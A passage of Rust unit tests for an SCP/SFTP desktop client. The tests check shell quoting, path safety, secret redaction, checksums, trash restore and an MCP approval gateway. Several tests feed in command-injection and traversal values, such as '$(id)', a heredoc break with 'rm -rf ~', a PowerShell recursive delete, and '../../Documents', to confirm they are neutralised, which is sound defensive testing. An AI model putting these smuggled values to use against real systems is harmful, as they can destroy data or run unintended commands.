            .unwrap();
        {
            use std::io::Write;
            let stdin = child.stdin.as_mut().unwrap();
            stdin.write_all(b"pwd -P\nexit\n").unwrap();
        }
        let out = child.wait_with_output().unwrap();
        let printed = String::from_utf8_lossy(&out.stdout);
        let last = printed.lines().last().unwrap_or_default().to_string();
        assert_eq!(
            std::fs::canonicalize(&last).unwrap(),
            std::fs::canonicalize(&evil).unwrap()
        );
        assert!(!dir.path().join("PWNED").exists());
        assert!(!evil.join("PWNED").exists());
    }

    #[cfg(unix)]
    #[test]
    fn ssh_launcher_script_is_private_and_parses_back_to_the_same_argv() {
        use std::os::unix::fs::PermissionsExt;
        let args: Vec<String> = vec![
            "-p".into(),
            "22".into(),
            "--".into(),
            "u@h".into(),
            remote_terminal_command("/srv/a'b $(id)"),
        ];
        let path = write_ssh_launcher_script(&args).unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        let contents = std::fs::read_to_string(&path).unwrap();
        let _ = std::fs::remove_file(&path);
        assert_eq!(mode, 0o600);
        let ssh_line = contents.lines().nth(2).unwrap();
        assert_eq!(ssh_line, format!("ssh {}", sh_join(&args)));
    }

    #[test]
    fn linux_terminal_args_never_use_a_shell_string() {
        let args = vec!["-p".to_string(), "22".to_string()];
        assert_eq!(
            linux_terminal_exec_args("gnome-terminal", "ssh", &args),
            vec!["--", "ssh", "-p", "22"]
        );
        assert_eq!(
            linux_terminal_exec_args("kitty", "ssh", &args),
            vec!["ssh", "-p", "22"]
        );
        assert_eq!(
            linux_terminal_exec_args("xfce4-terminal", "ssh", &args),
            vec!["-x", "ssh", "-p", "22"]
        );
        assert_eq!(
            linux_terminal_exec_args("konsole", "ssh", &args),
            vec!["-e", "ssh", "-p", "22"]
        );
    }

    #[test]
    fn move_to_trash_script_quotes_values_and_rejects_newlines() {
        let path = "/home/u/x'$(id)";
        let script = build_move_to_trash_script(path).unwrap();
        assert!(script.contains(&format!(
            "mv -- {} ~/.local/share/Trash/files/",
            sh_quote(path)
        )));
        assert!(!script.contains("<<"));
        assert!(build_move_to_trash_script("/home/u/x\nEOF\nrm -rf ~").is_err());
        assert!(build_move_to_trash_script("/").is_err());
        assert_eq!(trash_item_basename("/home/u/dir/"), "dir");
    }

    #[test]
    fn session_ids_are_unique_and_path_safe() {
        assert!(is_valid_session_id("site-1712345678901"));
        assert!(is_valid_session_id("local"));
        assert!(!is_valid_session_id(""));
        assert!(!is_valid_session_id("../../Documents"));
        assert!(!is_valid_session_id("/Users/victim"));
        assert!(!is_valid_session_id(&"a".repeat(65)));

        let none_taken = |_: &str| false;
        assert_eq!(choose_session_id("site-1", none_taken), "site-1");

        let taken = |c: &str| c == "site-1";
        let second = choose_session_id("site-1", taken);
        assert!(second.starts_with("site-1-") && second.len() == "site-1-".len() + 8);
        assert!(is_valid_session_id(&second));

        for requested in [
            "../../Documents",
            "/Users/victim/Documents",
            "",
            "a b",
            &"x".repeat(200),
        ] {
            let id = choose_session_id(requested, none_taken);
            assert!(is_valid_session_id(&id), "{requested:?} -> {id:?}");
            assert!(!id.contains('/') && !id.contains(".."));
        }
        assert!(choose_session_id("", none_taken).starts_with("session-"));
        assert!(choose_session_id("../../Documents", none_taken).starts_with("Documents-"));
    }

    #[test]
    fn site_ids_are_normalized_deterministically() {
        assert_eq!(normalize_site_id("site-1"), "site-1");
        let a = normalize_site_id("/Users/victim/Documents");
        let b = normalize_site_id("/Users/victim/Documents");
        assert_eq!(a, b);
        assert!(a.starts_with("site-") && is_valid_session_id(&a));
        let empty = normalize_site_id("");
        assert!(is_valid_session_id(&empty));
    }

    #[test]
    fn saved_secrets_are_redacted_for_the_webview() {
        let redacted = redact_site(&site("s1", AuthMethod::Password("hunter2".into())));
        assert!(matches!(&redacted.auth, AuthMethod::Password(p) if p == STORED_SECRET_MARKER));

        let empty = redact_site(&site("s1", AuthMethod::Password(String::new())));
        assert!(matches!(&empty.auth, AuthMethod::Password(p) if p.is_empty()));

        let key = redact_site(&site(
            "s1",
            AuthMethod::PrivateKey {
                path: "~/.ssh/id_ed25519".into(),
                passphrase: Some("pp".into()),
            },
        ));
        match &key.auth {
            AuthMethod::PrivateKey { path, passphrase } => {
                assert_eq!(path, "~/.ssh/id_ed25519");
                assert_eq!(passphrase.as_deref(), Some(STORED_SECRET_MARKER));
            }
            other => panic!("unexpected auth {other:?}"),
        }

        let no_pp = redact_site(&site(
            "s1",
            AuthMethod::PrivateKey {
                path: "k".into(),
                passphrase: None,
            },
        ));
        assert!(matches!(
            &no_pp.auth,
            AuthMethod::PrivateKey {
                passphrase: None,
                ..
            }
        ));

        let json = serde_json::to_string(&redact_sites(&[site(
            "s1",
            AuthMethod::Password("hunter2".into()),
        )]))
        .unwrap();
        assert!(!json.contains("hunter2"));
    }

    #[test]
    fn stored_secret_marker_is_swapped_for_the_saved_secret() {
        let stored = site("s1", AuthMethod::Password("hunter2".into()));

        let mut incoming = site("s1", AuthMethod::Password(STORED_SECRET_MARKER.into()));
        restore_stored_secret(&mut incoming, Some(&stored));
        assert!(matches!(&incoming.auth, AuthMethod::Password(p) if p == "hunter2"));

        // A newly typed password is kept as-is.
        let mut typed = site("s1", AuthMethod::Password("new-pass".into()));
        restore_stored_secret(&mut typed, Some(&stored));
        assert!(matches!(&typed.auth, AuthMethod::Password(p) if p == "new-pass"));

        // No saved site (or no stored secret): the marker becomes empty, never a password.
        let mut orphan = site("s2", AuthMethod::Password(STORED_SECRET_MARKER.into()));
        restore_stored_secret(&mut orphan, None);
        assert!(matches!(&orphan.auth, AuthMethod::Password(p) if p.is_empty()));

        let mut wrong_kind = site("s1", AuthMethod::Password(STORED_SECRET_MARKER.into()));
        restore_stored_secret(&mut wrong_kind, Some(&site("s1", AuthMethod::None)));
        assert!(matches!(&wrong_kind.auth, AuthMethod::Password(p) if p.is_empty()));

        let stored_key = site(
            "s1",
            AuthMethod::PrivateKey {
                path: "k".into(),
                passphrase: Some("pp".into()),
            },
        );
        let mut key_in = site(
            "s1",
            AuthMethod::PrivateKey {
                path: "k2".into(),
                passphrase: Some(STORED_SECRET_MARKER.into()),
            },
        );
        restore_stored_secret(&mut key_in, Some(&stored_key));
        match &key_in.auth {
            AuthMethod::PrivateKey { path, passphrase } => {
                assert_eq!(path, "k2");
                assert_eq!(passphrase.as_deref(), Some("pp"));
            }
            other => panic!("unexpected auth {other:?}"),
        }

        let mut key_orphan = key_in.clone();
        key_orphan.auth = AuthMethod::PrivateKey {
            path: "k".into(),
            passphrase: Some(STORED_SECRET_MARKER.into()),
        };
        restore_stored_secret(&mut key_orphan, None);
        assert!(matches!(
            &key_orphan.auth,
            AuthMethod::PrivateKey {
                passphrase: None,
                ..
            }
        ));

        // Redact then restore gives back the original secret.
        let mut round_trip = redact_site(&stored);
        restore_stored_secret(&mut round_trip, Some(&stored));
        assert!(matches!(&round_trip.auth, AuthMethod::Password(p) if p == "hunter2"));
    }

    #[test]
    fn display_names_are_plain_file_names() {
        let n = sanitize_display_name("../Library/Keychains/login.keychain-db", "RustSCP");
        assert!(!n.contains('/') && !n.contains(".."), "{n}");
        assert!(!n.starts_with('.') && !n.starts_with('-'));
        let n = sanitize_display_name("x'; Remove-Item C:\\ -Recurse; '", "RustSCP");
        assert!(
            !n.contains('\'') && !n.contains(';') && !n.contains('\\'),
            "{n}"
        );
        assert_eq!(
            sanitize_display_name("Servidor São Paulo", "RustSCP"),
            "Servidor São Paulo"
        );
        assert_eq!(sanitize_display_name("..", "RustSCP"), "RustSCP");
        assert_eq!(sanitize_display_name("", "RustSCP"), "RustSCP");
        assert!(sanitize_display_name(&"a".repeat(300), "x").chars().count() <= 64);
    }

    #[test]
    fn stored_secret_marker_matches_the_ui_constant() {
        let ui = include_str!("../../ui/src/utils/secrets.ts");
        assert!(ui.contains(&format!("'{}'", STORED_SECRET_MARKER)));
    }
}

#[cfg(test)]
mod correctness_tests {
    use super::*;

    /// Unique scratch directory under the system temp dir, removed on drop.
    struct Scratch(std::path::PathBuf);
    impl Scratch {
        fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!(
                "rustscp-ctest-{tag}-{}",
                uuid::Uuid::new_v4().simple()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            Self(dir)
        }
        fn join(&self, name: &str) -> std::path::PathBuf {
            self.0.join(name)
        }
        fn s(&self, name: &str) -> String {
            self.join(name).to_string_lossy().to_string()
        }
    }
    impl Drop for Scratch {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn local_vfs() -> Arc<dyn VirtualFileSystem> {
        Arc::new(LocalFsDriver::new())
    }

    fn pattern(len: usize) -> Vec<u8> {
        (0..len).map(|i| (i * 31 % 251) as u8).collect()
    }

    #[test]
    fn editor_text_is_never_lossy() {
        assert_eq!(decode_editor_text(b"hello\n".to_vec()).unwrap(), "hello\n");
        assert_eq!(
            decode_editor_text("café ação".as_bytes().to_vec()).unwrap(),
            "café ação"
        );
        // Latin-1 "café": invalid UTF-8 is refused instead of becoming U+FFFD.
        assert_eq!(
            decode_editor_text(b"caf\xe9".to_vec()).unwrap_err(),
            E_BINARY
        );
        assert_eq!(
            decode_editor_text(b"ELF\0\x01\x02".to_vec()).unwrap_err(),
            E_BINARY
        );
        let bom = [&[0xEF, 0xBB, 0xBF][..], b"x"].concat();
        assert_eq!(decode_editor_text(bom).unwrap(), "\u{feff}x");
    }

    #[test]
    fn editor_commands_split_like_a_shell() {
        assert_eq!(split_command_line("code", true).unwrap(), vec!["code"]);
        assert_eq!(
            split_command_line("  code   --wait ", true).unwrap(),
            vec!["code", "--wait"]
        );
        assert_eq!(
            split_command_line("\"/Applications/My Editor.app/bin/ed\" -n", true).unwrap(),
            vec!["/Applications/My Editor.app/bin/ed", "-n"]
        );
        assert_eq!(
            split_command_line("'a b' c\\ d \"e\\\"f\"", true).unwrap(),
            vec!["a b", "c d", "e\"f"]
        );
        assert_eq!(split_command_line("", true).unwrap(), Vec::<String>::new());
        assert!(split_command_line("code 'unterminated", true).is_err());
        assert!(split_command_line("code \"unterminated", true).is_err());
        // Windows: backslashes are path separators, quotes still group.
        assert_eq!(
            split_command_line("C:\\Tools\\ed.exe -n", false).unwrap(),
            vec!["C:\\Tools\\ed.exe", "-n"]
        );
        assert_eq!(
            split_command_line("\"C:\\Program Files\\Ed\\ed.exe\" --wait", false).unwrap(),
            vec!["C:\\Program Files\\Ed\\ed.exe", "--wait"]
        );
    }

    #[test]
    fn s3_endpoints_keep_scheme_and_port() {
        assert_eq!(
            s3_endpoint("s3.eu-west-1.amazonaws.com", 443),
            "https://s3.eu-west-1.amazonaws.com"
        );
        assert_eq!(s3_endpoint("minio.lan", 9000), "https://minio.lan:9000");
        assert_eq!(
            s3_endpoint("http://minio.lan:9000", 443),
            "http://minio.lan:9000"
        );
        assert_eq!(
            s3_endpoint("http://minio.lan:9000", 9001),
            "http://minio.lan:9000"
        );
        assert_eq!(
            s3_endpoint("HTTP://minio.lan", 9000),
            "HTTP://minio.lan:9000"
        );
        // A host that merely starts with "http" still gets a scheme.
        assert_eq!(
            s3_endpoint("httpbin.example.com", 443),
            "https://httpbin.example.com"
        );
        assert_eq!(s3_endpoint("minio.lan/", 22), "https://minio.lan");
        assert_eq!(s3_endpoint("[::1]", 9000), "https://[::1]:9000");
        assert_eq!(s3_endpoint("[::1]:9000", 9001), "https://[::1]:9000");
        assert_eq!(
            s3_endpoint("https://host/base", 8443),
            "https://host:8443/base"
        );
    }

    #[test]
    fn s3_region_is_derived_from_the_endpoint() {
        let r = |e: &str| s3_region_from_endpoint(e);
        assert_eq!(r("https://s3.eu-west-1.amazonaws.com"), "eu-west-1");
        assert_eq!(r("https://s3.sa-east-1.amazonaws.com:443"), "sa-east-1");
        assert_eq!(
            r("https://bucket.s3.ap-southeast-2.amazonaws.com"),
            "ap-southeast-2"
        );
        assert_eq!(
            r("https://s3.dualstack.us-west-2.amazonaws.com"),
            "us-west-2"
        );
        assert_eq!(r("https://s3-eu-west-1.amazonaws.com"), "eu-west-1");
        assert_eq!(r("https://s3-external-1.amazonaws.com"), "us-east-1");
        assert_eq!(r("https://s3.amazonaws.com"), "us-east-1");
        assert_eq!(r("https://s3.eu-central-1.wasabisys.com"), "eu-central-1");
        assert_eq!(r("https://s3.us-west-004.backblazeb2.com"), "us-west-004");
        assert_eq!(r("https://abc123.r2.cloudflarestorage.com"), "auto");
        assert_eq!(r("http://minio.lan:9000"), "us-east-1");
    }

    #[test]
    fn duplicate_names_only_look_at_the_file_name() {
        assert_eq!(
            duplicate_candidate("/srv/my.site/Makefile", false, 1, false),
            "/srv/my.site/Makefile_copy"
        );
        assert_eq!(
            duplicate_candidate("/home/u/.bashrc", false, 1, false),
            "/home/u/.bashrc_copy"
        );
        assert_eq!(
            duplicate_candidate("/a/x.txt", false, 1, false),
            "/a/x_copy.txt"
        );
        assert_eq!(
            duplicate_candidate("/a/x.txt", false, 2, false),
            "/a/x_copy2.txt"
        );
        assert_eq!(
            duplicate_candidate("/a/b.tar.gz", false, 1, false),
            "/a/b_copy.tar.gz"
        );
        assert_eq!(
            duplicate_candidate("/a/my.dir/", true, 1, false),
            "/a/my.dir_copy"
        );
        assert_eq!(duplicate_candidate("x.txt", false, 3, false), "x_copy3.txt");
        assert_eq!(
            duplicate_candidate("C:\\data\\b.txt", false, 1, true),
            "C:\\data\\b_copy.txt"
        );
    }

    #[test]
    fn checksum_algorithms_are_explicit() {
        assert_eq!(
            ChecksumAlgo::parse("SHA-256").unwrap(),
            ChecksumAlgo::Sha256
        );
        assert_eq!(ChecksumAlgo::parse("sha256").unwrap(), ChecksumAlgo::Sha256);
        assert_eq!(ChecksumAlgo::parse("MD5").unwrap(), ChecksumAlgo::Md5);
        assert!(ChecksumAlgo::parse("SHA1").is_err());
        assert!(ChecksumAlgo::parse("CRC32").is_err());

        let sha = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
        assert_eq!(
            parse_remote_checksum(&format!("0\n{sha}  -\n"), ChecksumAlgo::Sha256),
            Some((0, sha.to_string()))
        );
        assert_eq!(
            parse_remote_checksum(
                "  12\nd41d8cd98f00b204e9800998ecf8427e\n",
                ChecksumAlgo::Md5
            ),
            Some((12, "d41d8cd98f00b204e9800998ecf8427e".to_string()))
        );
        assert_eq!(
            parse_remote_checksum("12\nnot-a-hash\n", ChecksumAlgo::Md5),
            None
        );
        assert_eq!(
            parse_remote_checksum(&format!("x\n{sha}\n"), ChecksumAlgo::Sha256),
            None
        );
    }

    #[cfg(unix)]
    #[test]
    fn remote_checksum_command_matches_local_hash() {
        let dir = Scratch::new("rsum");
        let data = pattern(70_000);
        std::fs::write(dir.join("it's $(x).bin"), &data).unwrap();
        let cmd = remote_checksum_command(&dir.s("it's $(x).bin"), ChecksumAlgo::Sha256);
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(&cmd)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let (size, hash) =
            parse_remote_checksum(&String::from_utf8_lossy(&out.stdout), ChecksumAlgo::Sha256)
                .unwrap();
        assert_eq!(size, data.len() as u64);
        assert_eq!(hash, hex::encode(Sha256::digest(&data)));
    }

    #[tokio::test]
    async fn streamed_checksum_and_copy_cross_chunk_boundaries() {
        let dir = Scratch::new("stream");
        let vfs = local_vfs();
        let data = pattern(STREAM_CHUNK_BYTES as usize * 2 + 12_345);
        std::fs::write(dir.join("big.bin"), &data).unwrap();
        std::fs::write(dir.join("empty.bin"), b"").unwrap();

        let sha = stream_checksum(&vfs, &dir.s("big.bin"), ChecksumAlgo::Sha256)
            .await
            .unwrap();
        assert_eq!(sha, hex::encode(Sha256::digest(&data)));
        let md5 = stream_checksum(&vfs, &dir.s("big.bin"), ChecksumAlgo::Md5)
            .await
            .unwrap();
        assert_eq!(md5, format!("{:x}", md5::compute(&data)));
        let empty = stream_checksum(&vfs, &dir.s("empty.bin"), ChecksumAlgo::Sha256)
            .await
            .unwrap();
        assert_eq!(empty, hex::encode(Sha256::digest(b"")));

        let copied = stream_copy_file(&vfs, &dir.s("big.bin"), &vfs, &dir.s("copy.bin"))
            .await
            .unwrap();
        assert_eq!(copied, data.len() as u64);
        assert_eq!(std::fs::read(dir.join("copy.bin")).unwrap(), data);

        std::fs::write(dir.join("old.bin"), pattern(5_000_000)).unwrap();
        stream_copy_file(&vfs, &dir.s("empty.bin"), &vfs, &dir.s("old.bin"))
            .await
            .unwrap();
        assert_eq!(std::fs::read(dir.join("old.bin")).unwrap().len(), 0);
    }

    #[tokio::test]
    async fn external_edit_copies_round_trip_privately() {
        let dir = Scratch::new("edit");
        let vfs = local_vfs();
        let data = pattern(STREAM_CHUNK_BYTES as usize + 99);
        std::fs::write(dir.join("remote.conf"), &data).unwrap();

        let local = dir.join("local.conf");
        let n = download_to_private_file(&vfs, &dir.s("remote.conf"), &local)
            .await
            .unwrap();
        assert_eq!(n, data.len() as u64);
        assert_eq!(std::fs::read(&local).unwrap(), data);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&local).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600);
        }
        // Never overwrites an existing local file.
        assert!(
            download_to_private_file(&vfs, &dir.s("remote.conf"), &local)
                .await
                .is_err()
        );

        let edited = pattern(1234);
        std::fs::write(&local, &edited).unwrap();
        upload_local_file(&vfs, &local, &dir.s("remote.conf"))
            .await
            .unwrap();
        assert_eq!(std::fs::read(dir.join("remote.conf")).unwrap(), edited);

        assert_eq!(local_file_name_for("/etc/nginx/nginx.conf"), "nginx.conf");
        assert_eq!(local_file_name_for("/srv/dir/"), "dir");
        assert_eq!(local_file_name_for("/"), "file");
        assert_eq!(local_file_name_for("/x/-rf"), "rf");
        assert_eq!(local_file_name_for("/x/a:b?.txt"), "a_b_.txt");
    }

    #[tokio::test]
    async fn quick_delete_verification_finds_leftovers() {
        let dir = Scratch::new("del");
        let vfs = local_vfs();
        std::fs::write(dir.join("a"), b"a").unwrap();
        std::fs::write(dir.join("b"), b"b").unwrap();
        std::fs::create_dir(dir.join("sub")).unwrap();
        std::fs::write(dir.join("sub").join("c"), b"c").unwrap();
        let targets = vec![dir.s("a"), dir.s("b"), dir.s("gone"), dir.s("sub/c")];
        std::fs::remove_file(dir.join("a")).unwrap();
        let mut remaining = remaining_remote_paths(&vfs, &targets).await;
        remaining.sort();
        assert_eq!(remaining, vec![dir.s("b"), dir.s("sub/c")]);

        for path in &remaining {
            remove_remote_path(&vfs, path).await.unwrap();
        }
        // Already-gone paths are not errors.
        remove_remote_path(&vfs, &dir.s("gone")).await.unwrap();
        remove_remote_path(&vfs, &dir.s("sub")).await.unwrap();
        assert!(!dir.join("b").exists() && !dir.join("sub").exists());
        assert_eq!(trim_trailing_slash("/a/b//"), "/a/b");
        assert_eq!(trim_trailing_slash("/"), "/");
        assert_eq!(trim_trailing_slash("//"), "/");
    }

    #[test]
    fn archive_formats_are_detected_case_insensitively() {
        assert_eq!(
            ArchiveKind::from_archive_name("/x/BACKUP.ZIP").unwrap(),
            ArchiveKind::Zip
        );
        assert_eq!(
            ArchiveKind::from_archive_name("a.TGZ").unwrap(),
            ArchiveKind::TarGz
        );
        assert_eq!(
            ArchiveKind::from_archive_name("a.tar.bz2").unwrap(),
            ArchiveKind::TarBz2
        );
        assert_eq!(
            ArchiveKind::from_archive_name("a.txz").unwrap(),
            ArchiveKind::TarXz
        );
        assert_eq!(
            ArchiveKind::from_archive_name("a.tar.zst").unwrap(),
            ArchiveKind::Tar
        );
        assert!(ArchiveKind::from_archive_name("a.7z").is_err());
        assert!(ArchiveKind::from_archive_name("a.RAR").is_err());
        assert_eq!(
            SingleFileCompression::detect("dump.sql.GZ"),
            Some(SingleFileCompression::Gzip)
        );
        assert_eq!(
            SingleFileCompression::detect("a.bz2"),
            Some(SingleFileCompression::Bzip2)
        );
        assert_eq!(
            SingleFileCompression::detect("a.xz"),
            Some(SingleFileCompression::Xz)
        );
        assert_eq!(SingleFileCompression::detect("a.tar.gz"), None);
        assert_eq!(SingleFileCompression::detect("a.zip"), None);
        assert_eq!(
            command_failure_detail(124, "", " "),
            "the command exited with code 124"
        );
        assert_eq!(command_failure_detail(1, "out", "err\n"), "err");
    }

    #[cfg(unix)]
    #[test]
    fn single_gzip_file_is_decompressed_without_replacing_files() {
        let have_gzip = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg("command -v gzip")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if !have_gzip {
            return;
        }
        let dir = Scratch::new("gz");
        std::fs::write(dir.join("it's.sql"), b"select 1;\n").unwrap();
        let gz = std::process::Command::new("gzip")
            .arg(dir.join("it's.sql"))
            .status()
            .unwrap();
        assert!(gz.success());
        let archive = dir.s("it's.sql.gz");
        let target = dir.s("out");
        let cmd =
            build_single_decompress_command(&archive, &target, SingleFileCompression::Gzip, false);
        let run = || {
            std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(&cmd)
                .output()
                .unwrap()
        };
        let first = run();
        assert!(
            first.status.success(),
            "{}",
            String::from_utf8_lossy(&first.stderr)
        );
        assert_eq!(
            std::fs::read(dir.join("out").join("it's.sql")).unwrap(),
            b"select 1;\n"
        );
        // A second run refuses to replace the decompressed file.
        let second = run();
        assert!(!second.status.success());
        assert_eq!(
            std::fs::read(dir.join("out").join("it's.sql")).unwrap(),
            b"select 1;\n"
        );
    }

    #[cfg(unix)]
    #[test]
    fn trash_restore_keeps_both_when_the_path_is_taken() {
        let home = Scratch::new("trash");
        let original = home.s("docs/report.txt");
        std::fs::create_dir_all(home.join("docs")).unwrap();
        std::fs::write(&original, b"old").unwrap();

        let sh = |script: &str| {
            std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(script)
                .env("HOME", &home.0)
                .output()
                .unwrap()
        };
        let moved = sh(&build_move_to_trash_script(&original).unwrap());
        assert!(
            moved.status.success(),
            "{}",
            String::from_utf8_lossy(&moved.stderr)
        );
        let id = std::fs::read_dir(home.join(".local/share/Trash/files"))
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .file_name()
            .to_string_lossy()
            .to_string();

        // A new file now lives at the original path.
        std::fs::write(&original, b"new").unwrap();
        let restored = sh(&build_restore_from_trash_script(&id));
        assert!(
            restored.status.success(),
            "{}",
            String::from_utf8_lossy(&restored.stderr)
        );
        let stdout = String::from_utf8_lossy(&restored.stdout);
        let expected = home.s("docs/report (restored 1).txt");
        assert!(stdout.contains(&format!("RESTORED:{expected}")), "{stdout}");
        assert_eq!(std::fs::read(&original).unwrap(), b"new");
        assert_eq!(std::fs::read(&expected).unwrap(), b"old");

        // Restoring an id that is gone fails instead of reporting success.
        let again = sh(&build_restore_from_trash_script(&id));
        assert!(!again.status.success());
    }

    #[test]
    fn system_probe_output_is_parsed() {
        let out = "---OS---\nPRETTY_NAME=\"Ubuntu 24.04 LTS\"\nID=ubuntu\n---UNAME---\nLinux 6.8.0 x86_64\n\
                   ---SHELL---\n/bin/bash\n---PKG---\napt-get\n---WHO---\n1000\nweb-01\n---SUDO---\nyes\n";
        let info = parse_system_probe(out);
        assert_eq!(info.os_name, "Ubuntu 24.04 LTS");
        assert_eq!(info.distro_id, "ubuntu");
        assert_eq!(info.kernel, "Linux 6.8.0 x86_64");
        assert_eq!(info.architecture, "x86_64");
        assert_eq!(info.default_shell, "/bin/bash");
        assert_eq!(info.package_manager, "apt-get");
        assert!(!info.is_root);
        assert!(info.has_sudo);
        assert_eq!(info.hostname, "web-01");

        let root = parse_system_probe(
            "---OS---\nPRETTY_NAME=\"Alpine Linux 3.20\"\n---WHO---\n0\n---SUDO---\nno\n",
        );
        assert!(root.is_root && root.has_sudo);
        assert_eq!(root.distro_id, "alpine");
        assert_eq!(root.package_manager, "apk");
    }

    #[cfg(unix)]
    #[test]
    fn system_probe_runs_in_a_posix_shell() {
        let out = std::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(SYSTEM_PROBE_SCRIPT)
            .output()
            .unwrap();
        let info = parse_system_probe(&String::from_utf8_lossy(&out.stdout));
        assert!(!info.kernel.is_empty());
        assert!(!info.hostname.is_empty());
    }

    fn action(id: &str) -> ActionDefinition {
        let mut a = ActionCatalog::builtin_actions().into_iter().next().unwrap();
        a.id = id.to_string();
        a.template = "echo hi".to_string();
        a
    }

    #[test]
    fn custom_actions_are_merged_and_saved_atomically() {
        let builtin = ActionCatalog::builtin_actions();
        let builtin_id = builtin[0].id.clone();
        let merged = merge_action_catalog(vec![action("custom-1"), action(&builtin_id)]);
        assert_eq!(merged.len(), builtin.len() + 1);
        assert_eq!(merged.iter().filter(|a| a.id == builtin_id).count(), 1);
        assert!(merged.iter().any(|a| a.id == "custom-1"));

        let dir = Scratch::new("actions");
        let path = dir.join("nested").join("custom_actions.json");
        assert!(read_custom_actions(&path).unwrap().is_empty());
        write_custom_actions(&path, &[action("custom-1"), action("custom-2")]).unwrap();
        let back = read_custom_actions(&path).unwrap();
        assert_eq!(
            back.iter().map(|a| a.id.as_str()).collect::<Vec<_>>(),
            vec!["custom-1", "custom-2"]
        );
        std::fs::write(&path, b"{ not json").unwrap();
        assert!(read_custom_actions(&path).is_err());
    }

    #[test]
    fn continuous_sync_destinations_use_forward_slashes() {
        assert_eq!(
            continuous_sync_dest("/srv/www/", "a\\b.txt"),
            "/srv/www/a/b.txt"
        );
        assert_eq!(continuous_sync_dest("/srv/www", "/c.txt"), "/srv/www/c.txt");
    }

    fn gateway(running: bool) -> GatewayStatus {
        GatewayStatus {
            running,
            connected_agents: 2,
            error: None,
        }
    }

    #[test]
    fn mcp_gateway_is_enabled_only_while_it_listens() {
        assert!(rustscp_mcp::transport_available());
        let exe = "/Applications/RustSCP.app/Contents/MacOS/rustscp-desktop";
        let info = mcp_status_info(true, gateway(true), 2, 7, Some(exe));
        assert!(info.enabled && info.transport_available && info.transport_running);
        assert_eq!(info.connected_agents, 2);
        assert_eq!(
            info.setup_command.as_deref(),
            Some("claude mcp add rustscp -- /Applications/RustSCP.app/Contents/MacOS/rustscp-desktop --mcp-stdio")
        );
        let json: serde_json::Value =
            serde_json::from_str(info.setup_json.as_deref().unwrap()).unwrap();
        assert_eq!(json["mcpServers"]["rustscp"]["command"], exe);
        assert_eq!(json["mcpServers"]["rustscp"]["args"][0], MCP_STDIO_FLAG);

        let stopped = mcp_status_info(
            true,
            GatewayStatus {
                running: false,
                connected_agents: 0,
                error: Some("address in use".into()),
            },
            1,
            0,
            Some(exe),
        );
        assert!(!stopped.enabled && !stopped.transport_running);
        assert_eq!(stopped.gateway_error.as_deref(), Some("address in use"));

        let offline = mcp_status_info(false, gateway(true), 1, 0, Some(exe));
        assert!(!offline.enabled && !offline.transport_available);
        assert!(offline.setup_command.is_none());
        let json = serde_json::to_value(&offline).unwrap();
        assert_eq!(json["enabled"], false);
        // Older payloads without the newer fields still deserialize.
        let old: McpStatusInfo = serde_json::from_str(
            r#"{"enabled":false,"active_sessions_count":1,"total_audit_events":0}"#,
        )
        .unwrap();
        assert!(!old.transport_available && old.setup_command.is_none());
    }

    #[test]
    fn mcp_setup_command_quotes_unusual_paths() {
        let cmd = mcp_setup_command("/Users/me/My Apps/RustSCP.app/Contents/MacOS/rustscp-desktop");
        if cfg!(windows) {
            assert!(cmd.contains("\"/Users/me/My Apps/"), "{cmd}");
        } else {
            assert_eq!(
                cmd,
                "claude mcp add rustscp -- '/Users/me/My Apps/RustSCP.app/Contents/MacOS/rustscp-desktop' --mcp-stdio"
            );
            assert_eq!(display_shell_arg("/opt/it's"), "'/opt/it'\\''s'");
        }
        assert_eq!(
            display_shell_arg("/usr/bin/rustscp-desktop"),
            "/usr/bin/rustscp-desktop"
        );
    }

    #[tokio::test]
    async fn mcp_approvals_deliver_one_answer_each() {
        let approvals = McpApprovals::default();
        let (tx, rx) = tokio::sync::oneshot::channel();
        let prompt = McpApprovalPrompt {
            id: "a1".into(),
            request: ApprovalRequest {
                agent_id: "claude-code (stdio)".into(),
                tool_name: "fs_write_file".into(),
                connection_id: "prod".into(),
                connection_name: "Prod".into(),
                path: "/etc/motd".into(),
                summary: "Replace /etc/motd (3 bytes) with 5 bytes".into(),
                new_size: 5,
                new_sha256: "x".into(),
                previous_size: Some(3),
                preview: Some("hello".into()),
                preview_truncated: false,
            },
            expires_at_ms: 1,
        };
        approvals.lock().insert("a1".into(), (prompt, tx));
        let listed = approvals.prompts();
        assert_eq!(listed.len(), 1);
        let json = serde_json::to_value(&listed[0]).unwrap();
        assert_eq!(
            json["path"], "/etc/motd",
            "request fields are flattened: {json}"
        );
        assert!(approvals.respond("a1", true));
        assert!(rx.await.unwrap());
        assert!(!approvals.respond("a1", false));
        assert!(approvals.prompts().is_empty());
    }

    #[test]
    fn command_output_keeps_the_tail_within_the_cap() {
        assert_eq!(cap_command_output("short".to_string(), 16), "short");
        let long = format!("{}\nlast line\n", "x".repeat(100));
        let capped = cap_command_output(long.clone(), 20);
        assert!(capped.starts_with("[... "), "{capped}");
        assert!(capped.ends_with("last line\n"), "{capped}");
        assert!(
            !capped.contains("xxxx"),
            "the cut starts on the next line: {capped}"
        );
        // Multi-byte characters are never split.
        let accents = "ação".repeat(10);
        let capped = cap_command_output(accents.clone(), 7);
        let tail = capped.split('\n').nth(1).unwrap();
        assert!(tail.len() <= 7 && accents.ends_with(tail), "{capped}");
        let big = "y".repeat(COMMAND_OUTPUT_MAX_BYTES + 10);
        let capped = cap_command_output(big, COMMAND_OUTPUT_MAX_BYTES);
        assert!(capped.len() < COMMAND_OUTPUT_MAX_BYTES + 64);
    }

    #[test]
    fn command_errors_are_readable() {
        use rustscp_core::CoreError;
        assert_eq!(
